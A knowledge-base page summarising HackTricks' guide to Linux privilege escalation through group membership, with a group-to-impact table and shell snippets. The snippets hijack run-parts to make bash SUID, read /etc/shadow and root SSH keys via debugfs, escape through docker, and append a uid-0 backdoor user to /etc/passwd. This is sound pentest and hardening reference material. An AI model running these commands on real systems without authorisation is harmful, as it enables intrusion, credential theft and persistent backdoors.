---
title: "HackTricks: Interesting Groups — Linux Privilege Escalation"
tags: [linux-hardening, privilege-escalation, linux-groups]
sources: [hacktricks-interesting-groups-linux-pe.md]
updated: 2026-05-01
---

# HackTricks: Interesting Groups — Linux Privilege Escalation

Source: [hacktricks-interesting-groups-linux-pe.md](../../raw/hacktricks-interesting-groups-linux-pe.md)

## Key Takeaways

Group membership is one of the first things to check after getting a shell. Several default Linux groups provide a direct or near-direct path to root. Check with `id` and cross-reference below.

## Group → Impact Map

| Group                      | Impact                      | Method                                            |
| -------------------------- | --------------------------- | ------------------------------------------------- |
| `sudo` / `admin` / `wheel` | Direct root                 | `sudo su`                                         |
| `shadow`                   | Password hash read          | `cat /etc/shadow` → crack                         |
| `staff`                    | PATH hijack                 | Write to `/usr/local/bin/`, e.g. fake `run-parts` |
| `disk`                     | Equivalent to root          | `debugfs /dev/sdX` → read/write any file          |
| `video`                    | Screen capture              | Read `/dev/fb0` raw framebuffer                   |
| `root`                     | Modify service configs/libs | `find / -group root -perm -g=w`                   |
| `docker`                   | Full host root              | `docker run -v /:/mnt … chroot /mnt bash`         |
| `lxc` / `lxd`              | Similar to docker           | Container escape vectors                          |
| `adm`                      | Log file read               | `/var/log/*` — credentials, tokens, session data  |
| `backup`                   | Archive access              | May expose configs, keys, DB dumps                |
| `operator`                 | Platform-specific ops       | Leaks sensitive runtime data                      |
| `lp`                       | Print spool read            | Document contents in queues                       |
| `mail`                     | Mail spool read             | Reset links, OTPs, internal creds                 |
| `auth` (OpenBSD)           | Exploit CVE-2019-19520      | Write to `/etc/skey` or `/var/db/yubikey`         |

## Key Techniques

### sudo/admin/wheel

```bash
sudo su
# or via pkexec SUID:
find / -perm -4000 2>/dev/null | grep pkexec
pkexec "/bin/sh"   # prompts for user password, not root
```

### shadow group

```bash
cat /etc/shadow
# ! or * prefix = locked; still useful for account classification
# Extract hash → hashcat/john
```

### staff group — PATH hijack via run-parts

```bash
# Cron + SSH login both invoke run-parts as root from PATH
cat /etc/crontab | grep run-parts
# If /usr/local/bin is writable:
echo '#!/bin/bash
chmod 4777 /bin/bash' > /usr/local/bin/run-parts
chmod +x /usr/local/bin/run-parts
# Wait for cron or new SSH login
/bin/bash -p   # → root
```

### disk group

```bash
df -h                       # find device for /
debugfs /dev/sda1
debugfs: cat /etc/shadow
debugfs: cat /root/.ssh/id_rsa
```

### docker group

```bash
docker run -it --rm -v /:/mnt ubuntu chroot /mnt bash
# Or add backdoor user:
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd
```

### adm group

```bash
# High-value log targets:
grep -r 'password\|token\|secret\|key' /var/log/ 2>/dev/null
cat /var/log/auth.log   # SSH/PAM creds, sudo commands
```

## /etc/shadow Hash Prefixes

- `$1$` = MD5, `$2a$`/`$2b$` = bcrypt, `$5$` = SHA-256, `$6$` = SHA-512
- `!hash` = password set but account locked
- `*` = no password ever set (service account)

## Related

- [linux-privilege-escalation](../concepts/linux-privilege-escalation.md)
- [HackTricks: Linux Privilege Escalation Checklist](hacktricks-privilege-escalation-checklist.md)
- [HackTricks](../entities/hacktricks.md)
